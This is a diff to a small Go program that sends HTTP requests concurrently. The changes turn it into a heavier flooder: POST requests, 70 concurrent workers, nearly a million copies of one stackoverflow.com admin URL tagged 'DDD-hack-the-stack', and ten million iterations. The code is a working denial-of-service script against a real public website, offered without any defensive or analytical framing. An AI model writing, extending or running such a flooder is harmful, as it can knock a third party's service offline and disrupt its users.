@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
 	"net/http"
 	"sync"
@@ -10,7 +11,10 @@ import (
 func downloadLink(url string, wg *sync.WaitGroup, client *http.Client) {
 	defer wg.Done()
 
-	resp, err := client.Get(url)
+	// Prepare the request body (if needed)
+	body := []byte("your-request-body") // Replace with your actual request body
+
+	resp, err := client.Post(url, "application/json", bytes.NewBuffer(body))
 	if err != nil {
 		// fmt.Printf("Error downloading %s: %s\n", url, err.Error())
 		return
@@ -24,8 +28,9 @@ func downloadLink(url string, wg *sync.WaitGroup, client *http.Client) {
 }
 
 func downloadAll(urls []string) {
-	concurrencyLimit := 50
-	delay := 1 * time.Nanosecond // Adjust the delay value as needed
+	concurrencyLimit := 70
+	// delay := 1 * time.Nanosecond // Adjust the delay value as needed
+	delay := 1 * time.Millisecond // Adjust the delay value as needed
 
 	client := http.Client{}
 	wg := sync.WaitGroup{}
@@ -45,12 +50,12 @@ func downloadAll(urls []string) {
 }
 
 func main() {
-	urlList := make([]string, 99999)
+	urlList := make([]string, 999999)
 	for i := range urlList {
-		urlList[i] = "https://stackoverflow.com/admin.php?DDD-hack-the-stack"
+		urlList[i] = "https://stackoverflow.com/admin.php?DDD-hack-the-stack" // Replace with your actual URL
 	}
 
-	iterations := 1000 // Number of times to iterate the code
+	iterations := 10000000 // Number of times to iterate the code
 
 	for i := 0; i < iterations; i++ {
 		start := time.Now()
